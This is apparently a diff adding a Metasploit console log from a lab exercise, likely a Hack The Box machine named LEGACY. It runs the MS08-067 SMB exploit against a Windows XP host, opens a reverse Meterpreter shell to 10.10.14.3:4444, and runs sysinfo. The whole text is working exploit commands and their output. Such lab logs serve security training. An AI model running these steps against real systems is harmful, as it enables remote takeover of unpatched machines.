@@ -1,0 +1,22 @@
+msf exploit(windows/smb/ms08_067_netapi) > set RHOST 10.10.10.4
+RHOST => 10.10.10.4
+msf exploit(windows/smb/ms08_067_netapi) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.3:4444
+[*] 10.10.10.4:445 - Automatically detecting the target...
+[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
+[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
+[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
+[*] Sending stage (179779 bytes) to 10.10.10.4
+[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.10.10.4:1417) at 2018-12-23 02:11:30 -0500
+
+
+========
+meterpreter > sysinfo
+Computer        : LEGACY
+OS              : Windows XP (Build 2600, Service Pack 3).
+Architecture    : x86
+System Language : en_US
+Domain          : HTB
+Logged On Users : 1
+Meterpreter     : x86/windows
